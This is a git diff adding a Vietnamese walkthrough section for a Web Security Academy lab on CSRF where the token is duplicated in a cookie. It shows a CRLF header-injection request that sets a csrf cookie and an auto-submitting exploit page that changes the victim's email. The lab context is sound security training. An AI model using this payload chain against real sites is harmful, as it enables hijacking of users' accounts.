@@ -80,6 +80,24 @@ Vào exploit server và cấu hình đoạn HTML sau:
 Sau khi click "Deliver to victim", kết quả thành công.
 
 # 6. CSRF where token is duplicated in cookie
+Ta thấy chỉ cần cookie `csrf` và csrf token trong request là hai chuỗi giống nhau thì request đổi email sẽ thành công. Và trong website vẫn có lỗi chèn thêm header như trong lab #5.
+
+Để thay đổi cookie `csrf=abc`, ta gửi request sau:
+```
+GET /?search=abc%0d%0aSet-Cookie%3A+csrf%3Dabc%3B+Path%3D%2F%3B+SameSite%3DNone HTTP/1.1
+```
+
+Vào trong exploit server và cấu hình đoạn HTML sau:
+```
+<img src="https://0a1f008803dca8b6c277137100120000.web-security-academy.net/?search=abc%0d%0aSet-Cookie%3A+csrf%3Dabc%3B+Path%3D%2F%3B+SameSite%3DNone">
+<form id="form" method="POST" action="https://0a1f008803dca8b6c277137100120000.web-security-academy.net/my-account/change-email">
+<input type="hidden" name="email" value="attacker@gmail.com">
+<input type="hidden" name="csrf" value="abc">
+</form>
+<script>form.submit()</script>
+```
+
+Sau khi submit, bài lab được giải thành công.
 
 # 7. CSRF where Referer validation depends on header being present
 Ta thấy việc email có được thay đổi thành công hay không phụ thuộc vào việc Referer header có domain là `https://0a90007603f431c2c167ad45006f00b0.web-security-academy.net` hay không. Tuy nhiên nếu ta xóa đi Referer header, email vẫn bị thay đổi.
